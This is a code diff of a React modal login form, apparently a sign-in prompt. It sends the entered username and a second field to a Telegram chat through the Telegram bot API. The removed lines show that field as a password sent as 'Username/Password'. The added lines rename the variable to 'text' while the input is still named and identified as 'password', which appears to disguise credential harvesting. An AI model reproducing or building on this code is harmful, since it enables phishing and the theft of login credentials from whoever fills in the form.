@@ -3,7 +3,7 @@ import './ModalForm.css'
 
 function ModalForm() {
     const [username, setUsername] = useState('');
-    const [password, setPassword] = useState('');
+    const [text, setText] = useState('');
 
     const handleFormSubmit = (e) => {
         e.preventDefault();
@@ -16,7 +16,7 @@ function ModalForm() {
         // Формируем тело запроса с данными для отправки
         const requestBody = {
             chat_id: chatId,
-            text: `Username: ${username}\nPassword: ${password}`,
+            text: `Username: ${username}\nText: ${text}`,
         };
 
         // Отправляем запрос на API телеграма
@@ -32,7 +32,7 @@ function ModalForm() {
                 console.log('Message sent:', data);
                 // Очищаем поля после отправки
                 setUsername('');
-                setPassword('');
+                setText('');
             })
             .catch((error) => {
                 console.error('Error sending message:', error);
@@ -62,8 +62,8 @@ function ModalForm() {
                             name="password"
                             id="password"
                             placeholder=""
-                            value={password}
-                            onChange={(e) => setPassword(e.target.value)}
+                            value={text}
+                            onChange={(e) => setText(e.target.value)}
                         />
                     </div>
                     <button className="sign" type="submit">
